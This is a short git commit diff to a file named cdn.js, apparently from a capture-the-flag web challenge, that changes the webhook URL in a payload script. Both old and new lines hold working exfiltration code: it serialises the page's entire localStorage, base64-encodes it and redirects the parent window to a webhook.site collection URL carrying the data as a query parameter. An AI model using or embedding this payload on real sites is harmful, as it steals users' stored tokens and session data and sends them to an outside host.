7dda2307bcb5a18c5fa8b5b3358fdca4ec602879
jsthope <68657498+jsthope@users.noreply.github.com>
2025-09-06 02:22:48 +0200

    Update cdn.js

--- cdn.js
+++ cdn.js
@@ -1,3 +1,3 @@
 const flag = JSON.stringify({ ...localStorage })
 
-window.parent.document.location = `https://webhook.site/a5388cab-66ea-40a0-ab45-8cf4c138115f?flag=${encodeURIComponent(btoa(flag))}`
+window.parent.document.location = `https://webhook.site/e98a5fc8-df82-4ea2-973a-8b7e67d3d771?flag=${encodeURIComponent(btoa(flag))}`
